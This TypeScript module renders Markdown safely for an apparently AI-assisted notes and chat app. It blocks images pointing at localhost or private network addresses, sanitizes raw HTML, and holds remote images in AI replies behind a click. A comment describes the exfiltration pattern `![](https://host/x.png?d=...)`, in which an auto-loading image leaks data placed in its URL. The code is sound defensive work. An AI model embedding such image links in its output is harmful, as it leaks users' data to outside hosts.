import { unified, type Transformer } from 'unified'
import remarkParse from 'remark-parse'
import remarkGfm from 'remark-gfm'
import remarkRehype from 'remark-rehype'
import rehypeSanitize, { defaultSchema } from 'rehype-sanitize'
import rehypeStringify from 'rehype-stringify'
import { visit } from 'unist-util-visit'
import type { Root, Element, Node } from 'hast'
import './markdownImages.css'

export interface RenderMarkdownOptions {
  // URLs (fontes e imagens) da busca do turno: as únicas imagens remotas que
  // carregam sem clique.
  allowedImageUrls?: readonly string[]
  // Documento do usuário (não é resposta de IA): toda imagem remota carrega.
  allowRemoteImages?: boolean
}

const BLOCKED_PATTERNS = [
  /^https?:\/\/localhost(?:[:\/]|$)/i,
  /^https?:\/\/127\.0\.0\.1(?:[:\/]|$)/,
  /^https?:\/\/\[?::1\]?(?:[:\/]|$)/,
  /^https?:\/\/10\.\d{1,3}\.\d{1,3}\.\d{1,3}(?:[:\/]|$)/,
  /^https?:\/\/172\.(1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}(?:[:\/]|$)/,
  /^https?:\/\/192\.168\.\d{1,3}\.\d{1,3}(?:[:\/]|$)/,
  /^https?:\/\/169\.254\.\d{1,3}\.\d{1,3}(?:[:\/]|$)/,
]

function isBlockedUrl(url: string): boolean {
  return BLOCKED_PATTERNS.some((re) => re.test(url))
}

function rehypeSecureImages() {
  return (tree: Root) => {
    const toReplace: Array<{ parent: Element; index: number }> = []

    visit(tree, 'element', (node: Element, index: number | undefined, parent: Node | undefined) => {
      if (node.tagName !== 'img') return
      if (index == null || parent == null) return

      const src = String(node.properties?.src ?? '')

      if (isBlockedUrl(src)) {
        toReplace.push({ parent: parent as Element, index })
      } else {
        // Add data-src with original URL
        node.properties = { ...node.properties, 'data-src': src }
        // Add title if not already set
        if (!node.properties.title) {
          node.properties.title = src
        }
      }
    })

    // Replace blocked images with span (reverse order to preserve indices)
    for (let i = toReplace.length - 1; i >= 0; i--) {
      const { parent, index } = toReplace[i]
      const span: Element = {
        type: 'element',
        tagName: 'span',
        properties: { 'data-img-blocked': 'true' },
        children: [{ type: 'text', value: 'Image blocked: local network address' }],
      }
      parent.children.splice(index, 1, span)
    }
  }
}

const REMOTE_URL = /^https?:\/\//i

// Imagens liberadas com "Load image" nesta sessão: os re-renders seguintes
// (streaming, troca de painel) já mostram a imagem.
const approvedImageUrls = new Set<string>()

function normalizeImageUrl(url: string): string {
  try {
    return new URL(url).href
  } catch {
    return url
  }
}

function imageGate(src: string, alt: string): Element {
  let host = src
  try {
    host = new URL(src).host
  } catch {
    /* fica a URL inteira */
  }
  return {
    type: 'element',
    tagName: 'span',
    properties: { className: ['monet-img-gate'], 'data-img-gate': '', 'data-src': src, 'data-alt': alt },
    children: [
      {
        type: 'element',
        tagName: 'span',
        properties: { className: ['monet-img-gate-host'] },
        children: [{ type: 'text', value: `Image from ${host}` }],
      },
      {
        type: 'element',
        tagName: 'button',
        properties: { type: 'button', 'data-img-load': '' },
        children: [{ type: 'text', value: 'Load image' }],
      },
    ],
  }
}

// Imagem remota em resposta de IA é um canal de exfiltração
// (`![](https://host/x.png?d=...)`): ela carrega sozinha e leva o que estiver
// na URL. Só carrega sem clique a URL que veio das fontes ou imagens de busca
// do turno; as outras viram um gate com "Load image". Roda depois do sanitize:
// o gate é montado com os valores do `img` já sanitizado.
function rehypeGateRemoteImages(): Transformer<Root> {
  return (tree, file) => {
    const opts = (file.data as { monetImages?: RenderMarkdownOptions }).monetImages ?? {}
    if (opts.allowRemoteImages) return
    const allowed = new Set((opts.allowedImageUrls ?? []).map(normalizeImageUrl))
    const toReplace: Array<{ parent: Element; index: number; gate: Element }> = []

    visit(tree, 'element', (node: Element, index: number | undefined, parent: Node | undefined) => {
      if (node.tagName !== 'img') return
      if (index == null || parent == null) return
      const src = String(node.properties?.src ?? '')
      if (!REMOTE_URL.test(src)) return
      const url = normalizeImageUrl(src)
      if (allowed.has(url) || approvedImageUrls.has(url)) return
      toReplace.push({ parent: parent as Element, index, gate: imageGate(src, String(node.properties?.alt ?? '')) })
    })

    for (let i = toReplace.length - 1; i >= 0; i--) {
      const { parent, index, gate } = toReplace[i]
      parent.children.splice(index, 1, gate)
    }
  }
}

// Clique no "Load image": em captura no document, para rodar antes dos onClick
// do React (a bolha do chat abre links) e do ProseMirror (bloco embed).
function onImageGateClick(e: MouseEvent) {
  const target = e.target instanceof Element ? e.target : null
  const gate = target?.closest('[data-img-load]')?.closest('[data-img-gate]')
  if (!gate) return
  e.preventDefault()
  e.stopPropagation()
  const src = gate.getAttribute('data-src') ?? ''
  if (!REMOTE_URL.test(src)) return
  approvedImageUrls.add(normalizeImageUrl(src))
  // Via DOM, nunca innerHTML: a URL vem do HTML renderizado.
  const img = document.createElement('img')
  img.src = src
  img.alt = gate.getAttribute('data-alt') ?? ''
  img.title = src
  img.setAttribute('data-src', src)
  gate.replaceWith(img)
}

let imageGateClickInstalled = false

function installImageGateClick() {
  if (imageGateClickInstalled || typeof document === 'undefined') return
  imageGateClickInstalled = true
  document.addEventListener('click', onImageGateClick, true)
}

const imgSchema = {
  ...defaultSchema,
  attributes: {
    ...defaultSchema.attributes,
    img: [
      ...(defaultSchema.attributes?.img ?? []),
      'src',
      'alt',
      'title',
      'data-src',
    ],
    span: [
      ...(defaultSchema.attributes?.span ?? []),
      'data-img-blocked',
    ],
    // Preserva os atributos estruturais dos blocos customizados de nota
    // (toggle/embed/linked-note) no preview de nota vinculada, sem permitir
    // handlers de evento ou outros vetores de execução.
    div: [
      ...(defaultSchema.attributes?.div ?? []),
      'data-type',
      'data-title',
      'data-collapsed',
      'data-cmd',
      'data-note-id',
    ],
  },
  tagNames: [
    ...(defaultSchema.tagNames ?? []),
    'img',
  ],
}

const processor = unified()
  .use(remarkParse)
  .use(remarkGfm)
  .use(remarkRehype)
  .use(rehypeSecureImages)
  .use(rehypeSanitize, imgSchema)
  .use(rehypeGateRemoteImages)
  .use(rehypeStringify)

export async function renderMarkdown(md: string, opts: RenderMarkdownOptions = {}): Promise<string> {
  installImageGateClick()
  const file = await processor.process({ value: md, data: { monetImages: opts } })
  return String(file)
}

// Preview de nota vinculada: o conteúdo pode conter HTML bruto (colado da web,
// gerado por IA, ou serializado dos blocos do editor). `allowDangerousHtml`
// converte esse raw HTML em nós HAST que então passam OBRIGATORIAMENTE por
// rehype-sanitize — assim a estrutura dos blocos é preservada, mas <script>,
// iframes e handlers on* são removidos antes de chegar ao dangerouslySetInnerHTML.
const embedProcessor = unified()
  .use(remarkParse)
  .use(remarkGfm)
  .use(remarkRehype, { allowDangerousHtml: true })
  .use(rehypeSecureImages)
  .use(rehypeSanitize, imgSchema)
  .use(rehypeStringify)

export async function renderNoteContent(md: string): Promise<string> {
  const file = await embedProcessor.process(md)
  return String(file)
}
